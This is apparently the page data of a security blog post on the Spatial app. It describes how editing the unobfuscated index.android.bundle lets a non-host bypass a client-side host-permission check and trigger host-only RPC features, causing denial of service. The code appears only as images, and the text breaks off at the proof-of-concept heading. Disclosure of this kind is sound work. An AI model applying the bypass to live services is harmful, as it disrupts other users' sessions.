{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/spatial-bypass-feature/",
    "result": {"data":{"cur":{"id":"ef38f498-7725-5d2a-9809-bf94beb784d9","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACmElEQVQozy2O609ScQCGz3/S5taqNZUjIHdomm45L1OUiwiElUoHBM4BDl7KPpHAueDhLjDM6zTnCjt5ob6mNXV9tn8g5yoky8nFX6N6Pz17n73bCxGwnoAHArDGX68hOcaY0BIRW2ISW1SEBXlIROqKybCY2J4QOiL8kUCdmuCoSFhFctQURwuRnAES1pFcbaBBFZYgMTkalTriMjwixX1cU1SGJZvGkwrXrAJLyV0MfzAA9xDcPoLTF6hTQiRs9MMm/w0VVWcI8REaHqJhK1Nv8/IsTqE1CJsZPhoRoGHBaLTRynBHfLdV/ptKf62a4RkhnxilkOWc88UmlmCxRG4ss+XM5Mbms2h4d2Jhy51mseRb1xyLVYFFEyw+l3Mk493PMiI7RF/Xf0psAQDKxRIAYHFpqUfZs7e/XywW82f5fD5f+FkolarqXyrlMgBgP5qlr/VCwXrkIPPub31VLBYlUmlNTQ3mdB4eHa4sLWez2e2dneMvx1eVyv9xqQpHc+9DtQhE8S17cRYAULooAgDW19Z0uv6DDx8vz3+ffDstnBfOvv84/Xry6+ICVMBVuVK+rL7YS+5GRR4o3ORKtk2tPWJWh0KrBm/Y/HyZfpnzL2Yw+k1i+zW1Pq+a2ng6/zrC2rvVK8PUK/Ps5kgqqrdTd61QuMUVuuOakdgJwWPvLa2xVme8Ty6Y/MGu8VTXdLrdm5bjOSQ1O0wam9sJnokRuhnFpK27E+nohOKtE+E2T7DVRjQ+oAXD4+LhDsmgj2uhRA6f0OEXojMKPC50orKHTc2qJ1wD3TBIKkcN/Z1KZTP0WUOw+nD63iQhMgdlDkrunla4SRlOSnFKOkbLPIQUDykmXTILolVFNBZGZN3QerBebWuL4A800WFtIdWVuAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Spatial-DOS\"\n        title=\"Spatial-DOS\"\n        src=\"/static/5ac793d4bb6879a194f35a2e596ca565/37523/spatial-io-main.png\"\n        srcset=\"/static/5ac793d4bb6879a194f35a2e596ca565/e9ff0/spatial-io-main.png 180w,\n/static/5ac793d4bb6879a194f35a2e596ca565/f21e7/spatial-io-main.png 360w,\n/static/5ac793d4bb6879a194f35a2e596ca565/37523/spatial-io-main.png 720w,\n/static/5ac793d4bb6879a194f35a2e596ca565/302a4/spatial-io-main.png 1080w,\n/static/5ac793d4bb6879a194f35a2e596ca565/2cefc/spatial-io-main.png 1400w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"attack-type\" style=\"position:relative;\"><a href=\"#attack-type\" aria-label=\"attack type permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Type</h2>\n<ul>\n<li>Client Side Code Injection</li>\n<li>Application-Level Denial-of-Service (DoS)</li>\n<li>App Crash</li>\n<li>Malformed Android Intents</li>\n</ul>\n<h2 id=\"attack-effect\" style=\"position:relative;\"><a href=\"#attack-effect\" aria-label=\"attack effect permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Effect</h2>\n<ul>\n<li>Application Level DOS</li>\n<li>Due to the Application Level DoS attack, normal functions operate the service abnormally, resulting in financial losses and time value investment, while reducing the reliability of the company.</li>\n</ul>\n<h2 id=\"vulnerability-detected-location\" style=\"position:relative;\"><a href=\"#vulnerability-detected-location\" aria-label=\"vulnerability detected location permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Detected Location</h2>\n<ul>\n<li>index.android.bundle</li>\n<li>Congregate Around Actor feature</li>\n<li>Respawn Other In Host spots feature</li>\n<li>iL2cpp.so</li>\n<li>SessionRPC</li>\n</ul>\n<h2 id=\"attack-point\" style=\"position:relative;\"><a href=\"#attack-point\" aria-label=\"attack point permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Point</h2>\n<h3 id=\"reactnative-indexandroidbundle\" style=\"position:relative;\"><a href=\"#reactnative-indexandroidbundle\" aria-label=\"reactnative indexandroidbundle permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReactNative index.android.bundle</h3>\n<ul>\n<li>Facebook, Hermes JavaScript Engine Migration → ReactNative</li>\n<li><code class=\"language-text\">index.android.bundle</code> The file serves as an interface function with the Main Source Code, and some formats can be modified because the code does not have Javascript obfuscation and symbol values.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">- base\n    - assets\n        - index.android.bundle</code></pre></div>\n<ul>\n<li>By modifying the <code class=\"language-text\">index.android.bundle</code> file, it is possible to induce and reverse abnormal operation by cracking various functions processed in the actual client environment.</li>\n</ul>\n<h3 id=\"react-native-javascript-side-ipc-to-unity-rpc\" style=\"position:relative;\"><a href=\"#react-native-javascript-side-ipc-to-unity-rpc\" aria-label=\"react native javascript side ipc to unity rpc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>React Native Javascript Side IPC to Unity (RPC)</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 87.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAACQklEQVQ4y52Uy47TMBSG8zITt7Edxz6+5NaETjsjcRGPwCswCxY8DcwKibcCdcmKFSJV+JGTTmcQQ9Vh8esklv3Z/znHTtrqxbf16vXX3j/bael2XLod47RbCJrimfrCOH1nnN4kuW7Qllt0rsNCOjBOWAj7JN2tYZzeJapo0birvQ2bUaowLoSdxGLkNLLzNByANwnPK7iiHpW0EMJhKf7rlPsjUKsaK9OO3tYoqQSZAK5mKOMGLDNz5IQ0KrvXxUEsM/t5Pt0kTBA0dWMT1rhsrtBXHUiXENKDqxpctxBFDS4dZO6gbZjlShhXTt+iqPc8D3Hjm0RIB5X7sdABZEo4KpHnHlw4iKIB1yvwI9AfITEaX4J8CambfSb9DIzeDfXTCdfNNbq6g1QeKbdIMw0W9cDyxfKB3eXd/wPL087SjfFUhbTQuYVSDkJ5ZFMbPbEomXCw1I9VWGPVv0K72qKsenhfT9Bjj8WF/6g+43QPnCe70RUVVmEDX60Ryh7BNyAK8L6CpvJ8IJsHx1gclzvY3CEX0bqHyT0opiL3J3vzD2DMoRB2XIqYdPPowmns/nqdBsbEW7MaQ+jRtxs0dY8QaigdpkrGip6CPWo5U9VYmQ5t/RJV9xy+3sLaGtoEFCachC2E/fVXUVJOP4W0w6Wphq1vho1rhuDqQRZ+kMrHiz/MDwBN8RH9OADfJvHJirYzYafbIWNfCjd9p4dmfsIz9j5R1H4qiurjgpvblJvbi2xWmplbxulcfWCcPqeZ6X8DoL4bWiICzvIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"UnityMessage custome functions\"\n        title=\"UnityMessage custome functions\"\n        src=\"/static/98969f85098c32580983f4899747a0b3/37523/s-code-1.png\"\n        srcset=\"/static/98969f85098c32580983f4899747a0b3/e9ff0/s-code-1.png 180w,\n/static/98969f85098c32580983f4899747a0b3/f21e7/s-code-1.png 360w,\n/static/98969f85098c32580983f4899747a0b3/37523/s-code-1.png 720w,\n/static/98969f85098c32580983f4899747a0b3/35751/s-code-1.png 873w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">UnityMessages</code> defined Unity Interface abstracted from React Native Javascript-side (RN-side) to call customized functions on Unity, processing data input from client side on RN-side, processing and rendering through IPC communication to Unity, and internal processing through RPC communication.</li>\n</ul>\n<p>Unity uses RPC to distribute and process each function, but there are deficiencies in areas requiring authentication, and there is no authentication for functions that must operate in Host authority, so there is a vulnerability to arbitrarily send RPC communication.</p>\n<h2 id=\"vulnerability-details\" style=\"position:relative;\"><a href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Details</h2>\n<h3 id=\"normal-flow-unity-ipc-rn-side-to-congregatearoundactor-respawnothersinhotspots-function-defined\" style=\"position:relative;\"><a href=\"#normal-flow-unity-ipc-rn-side-to-congregatearoundactor-respawnothersinhotspots-function-defined\" aria-label=\"normal flow unity ipc rn side to congregatearoundactor respawnothersinhotspots function defined permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>normal flow (Unity IPC, RN Side to congregateAroundActor, respawnOthersInHotspots function defined)</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABMElEQVQoz32Rz0rDQBCH+zJmtjubNsnsnyRtbWwpooLv590XUAqefYMK4lXJ0Yvi0bg7srVCqbWHjxkY+ObHTA+QloOsfq3c7OVkct42zUVb101r3KSVyrSJpFYgtXCYZ0B6A6SrnlD6CZRhOTBc1Q3bZsFuPmc9bViPK87HFQttGZBYKL2X3xkg3UXhSirNUlGnMvL9rPDJsPBJRh5y7UVuPGTaA5IXqD0oWvc7fG6EN1H4kA9LLoqRN2bC1kyYinINpoaPRMHQjwmIYSvNTsJuU297QtFKDqJg/NUcn4Xp4jKMZqehbuahcGUYWhdS7QKgDgIpgKIA+IduO+Fj3NxPNZO1nDnHWNofnOW0cow23lD/e0OhdNgIl1F4n6amk0q/J0gfidwP4EHih6Pw+htwtNMIwxJuLAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"unity react native code\"\n        title=\"unity react native code\"\n        src=\"/static/4bce1604225ebe09c49a0ac29b6a6181/37523/s-code-2.png\"\n        srcset=\"/static/4bce1604225ebe09c49a0ac29b6a6181/e9ff0/s-code-2.png 180w,\n/static/4bce1604225ebe09c49a0ac29b6a6181/f21e7/s-code-2.png 360w,\n/static/4bce1604225ebe09c49a0ac29b6a6181/37523/s-code-2.png 720w,\n/static/4bce1604225ebe09c49a0ac29b6a6181/5d72a/s-code-2.png 834w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>The two interface functions <code class=\"language-text\">(cogregateAroundActor, respawnOtherInHotspots)</code> perform Unity IPC transmission through the <code class=\"language-text\">sendMessageToUnity</code> name key value without data, and the Unity side operates in the order of function calls through RPC communication based on that data.</li>\n</ul>\n<h3 id=\"the-functional-part-implemented-on-the-rn-side-congregatearoundactor-respwnothersinhotspots\" style=\"position:relative;\"><a href=\"#the-functional-part-implemented-on-the-rn-side-congregatearoundactor-respwnothersinhotspots\" aria-label=\"the functional part implemented on the rn side congregatearoundactor respwnothersinhotspots permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The functional part implemented on the RN-side (congregateAroundActor, respwnOthersInHotspots)</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAuklEQVQI14XKPW4CMRBA4b2N1zv765n1eG0TWCEuyBU4AGdAHADkKk3KJJouFe0guECKT695Vd3SFcfwx3P4jTlJzFGIs1DYilv2MudVyAdxyNJPXro+inNbgYHFAErd0qs/BvBhAE9V3dL36FiXnDTvki4fG8W0KqVVMR/UxVWRWF/PhKzdwNoPSUeX1XazGkCtW3ozgJeq6f25GefPzvv7ELg0FIrFVCzGYikWO/liAP9zM4BfBvD4BAsGWMCd08HOAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"unityMessages functions\"\n        title=\"unityMessages functions\"\n        src=\"/static/d2bd6d050f587b1a84b356f945f7c6a4/37523/s-code-3.png\"\n        srcset=\"/static/d2bd6d050f587b1a84b356f945f7c6a4/e9ff0/s-code-3.png 180w,\n/static/d2bd6d050f587b1a84b356f945f7c6a4/f21e7/s-code-3.png 360w,\n/static/d2bd6d050f587b1a84b356f945f7c6a4/37523/s-code-3.png 720w,\n/static/d2bd6d050f587b1a84b356f945f7c6a4/b97f6/s-code-3.png 958w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">bringUsersToMeHostTollAvailable</code> function object checks the user profile and returns whether Host-tools can be used within the session to the Boolean value to perform the next quarter.</li>\n<li>UnityMessages : <code class=\"language-text\">congregateAroundActor</code>, <code class=\"language-text\">respwnOthersInHotspots</code></li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 76.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAENElEQVQ4y3WTe0ybZRTGT6Ed0JZepKXcBxZklEI7oFy3UmRQumTMC7DgZgMOE4QhBgdm0TBjdDKXgGSRUSAgUTODi8g2R1VgY+AE5KKggE4uujaA49LSC5f2+44pLKh/7CS/PO97cvKc5H3ygjK/H4qr8diLlYaJV6qWB85cWhk9VWnp7tEhp/bTBVC/8aUTAACDHwjA9ARweQKceQHw2Or9fvj12rrm33vvDf80r18en32wOH71i+sTDS2fD8/plqLbvu7am6XS+c40Bp9Ko//LPgafSqXzqE5MgTNDKge41qEdTFVm4dHMU/hyUTmqT5diovwYFhSW49DYL2cREWi8IAYA7ANwAXDhAbj+Bzf+jjoxBMCOTQJoa781Gp+kQkl0ik0ak0JIolOIcImcyMt7Fc/X1rU5h0aOJh5Knws6EDUFQD8HdEEhsH1LwJVfDG47FIErv9SJ6XWCnZhEgbGJ6VFNw8dYe7meaGhqxZaWz8hLH9YRzW3t2NHZ/S7QWStxyQqMSjqEB6RR6MPiYoATDQNZHPRz5+yoB5OFFAZH5+6lpMGayTprs22j1WImrFYLIiJp3twgFq1mvN0/+DZQaJMh4oitUInUGBYpMYRGis2x2Zlb/my2wY/FNgSw2aveLNYmlckZAK6KCg9XjfeXlpZwbn6e0On1iCRJ6v5esv+2uIB9/YPnHQEDx8sHKK4+jnNxl/bEB7PTwxCVIAC2tycIwwXg/5QXJSiceyU3A8Bk3RpvbGxEtVpNlJaWYllZGZn/Ur79h6EhnJi8f2506o+9lCveeR8MhO25Kb1u2nHPfa0C/OMUwBBGgFuwFAAoTrBpI7uqqi5iWlqaPSsrG7Ozs0llejpxt68P+wdGqgDAP//0GVHuyQIRAPj2/ThyVr+2OpOXV3hQpXw25OQLBWFicVzo7koawMY20VNTU4MKhcKuVqsxJyeHzFAqcXRsjGxuvfqdMFiyHC2Tb8YnpFoipQnWaJl8/bBCZRJLE00HZcnWRLnS6rtfZAEat4PO8q6ELTv2XKiqwhiZzJ55/DimZ2SQ8YkJxJ27fXit49ZFFw5nPUIWg+HRURgsFuOT4nD08xJgAJOB+93d0YfJxEA2Cz2ZTHR1Z23Dlo3svvDmWxghFNqPKhTk0/HxZIxIZL95/QaO/PxrhQub03Q49cjtuMPyzqj4BK1MLtdKQkK0Yi5XG87ja0U8nlbkwesM8/D4hu/Ba4KNje3u98rLMTk2dvN5lcr2TFqaTR4Ts9lz4yYajZYSAu07r+P4MXvUFwE6eiyALSoAugFsuAEEOQbXzRu937Z/hZqaGvxE04CtV+qxvroaJ0fGcP7BQskjE+r/DE1Nu4YU2NVHCB2GM3/qjzxcWWtZN1nqDUaTxmA0a8xma+PM3F+XNc2tQXfuDULtRxoKm+cDj8d3R7me/vAPIJD5aJ/ebWwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Attack Flow\"\n        title=\"Attack Flow\"\n        src=\"/static/90a40d2e38ba6b1402125f201a36cb88/37523/s-code-4.png\"\n        srcset=\"/static/90a40d2e38ba6b1402125f201a36cb88/e9ff0/s-code-4.png 180w,\n/static/90a40d2e38ba6b1402125f201a36cb88/f21e7/s-code-4.png 360w,\n/static/90a40d2e38ba6b1402125f201a36cb88/37523/s-code-4.png 720w,\n/static/90a40d2e38ba6b1402125f201a36cb88/302a4/s-code-4.png 1080w,\n/static/90a40d2e38ba6b1402125f201a36cb88/2cefc/s-code-4.png 1400w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Users with the Hosts authority of Room can check the function of calling the general user around them or respawn in the room.</li>\n<li>When the corresponding function is actually performed, the code execution is operated while being re-rendering from each device (PC, VR, WEB) of the user.</li>\n</ul>\n<p><strong>abnormal flow (RN: Insufficient authority check.)</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABFklEQVQY04XHTUrDQBTA8Vymk3beJJnMy8ekto1Jk8ZAEVdiLXoOL+EhPEFxIwpuXHkD16KFggu3yts8aa34sXHx48/fUdpedMG8ip5+ElIvhQx/0EvR21o/mG9yXVy6n55dwBcX8NYJzfAuzg/ZViecFMecFjO21SknxYzT8ZxtNWc7nnNSHjHGFWdpyzZpORs0rKMhe0HGKrCsgozBt4+O9JPryIy47R+8Nf0p1dmI9vo5TdJdaouKplVNbVnTfjOh6TinOhlQEw6ojXaoDC01YUa1tu9DbTnW9sGBIL1XCtkHw4EXceDhpr4y7MnwNzB/4IYPyADIAnDlKG3Puiq+6UhcdCRefhGwFm37r4UAvHLBnH8A8ZSV9s231pEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"unity client React Native Code - bringUsersToMeHostToolAvailable function\"\n        title=\"unity client React Native Code - bringUsersToMeHostToolAvailable function\"\n        src=\"/static/b12b00dd7d6f4cabe6a95744fb60a325/37523/s-code-5.png\"\n        srcset=\"/static/b12b00dd7d6f4cabe6a95744fb60a325/e9ff0/s-code-5.png 180w,\n/static/b12b00dd7d6f4cabe6a95744fb60a325/f21e7/s-code-5.png 360w,\n/static/b12b00dd7d6f4cabe6a95744fb60a325/37523/s-code-5.png 720w,\n/static/b12b00dd7d6f4cabe6a95744fb60a325/0f2bc/s-code-5.png 742w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>In order to check whether the user can use the host’s tool function, RN side lists the user profiles of <code class=\"language-text\">RoomSession</code> and assigns True/False to the object <code class=\"language-text\">brinUsersToMeHostTool</code> through comparison conditions.</li>\n<li>The actual server checks the user’s permission using the Security Auth Header for ‘RoomSession’, but since the RN side processes it twice, the value returned through Code Injection can be modified and operated in the desired direction.</li>\n</ul>\n<h3 id=\"target-feature-dos-poc-code-injection\" style=\"position:relative;\"><a href=\"#target-feature-dos-poc-code-injection\" aria-label=\"target feature dos poc code injection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target Feature DOS POC (Code Injection)</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.888888888888886%; position: relative; bottom: 0; left: 0; background-image: 